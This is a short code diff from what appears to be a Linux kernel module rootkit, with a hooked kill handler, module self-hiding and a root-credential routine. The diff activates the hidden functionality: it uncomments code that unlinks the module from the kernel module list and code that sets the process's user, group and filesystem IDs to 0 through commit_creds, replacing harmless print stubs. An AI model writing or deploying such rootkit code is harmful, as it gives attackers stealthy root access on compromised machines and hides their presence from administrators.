@@ -19,7 +19,7 @@ asmlinkage int killHook(pid_t pid, int sig) {
 }
 
 void toggleHiding() {
-    /*if (isHidden == 1) {
+    if (isHidden == 1) {
         list_add(&THIS_MODULE->list, priorModule);
         isHidden = 0;
     } else {
@@ -27,12 +27,11 @@ void toggleHiding() {
         list_del(&THIS_MODULE->list);
         isHidden = 1;
     }
-    return;*/
-    printk(KERN_INFO "HIDING\n");
+    return;
 }
 
 void setRoot() {
-    /*struct cred *root;
+    struct cred *root;
     root = prepare_creds();
     printk(KERN_INFO "btk::0x1\n");
     if (root == NULL)
@@ -42,6 +41,5 @@ void setRoot() {
     root->suid.val = root->sgid.val = 0;
     root->fsuid.val = root->fsgid.val = 0;
     commit_creds(root);
-    return;*/
-    printk(KERN_INFO "ROOTING\n");
+    return;
 }
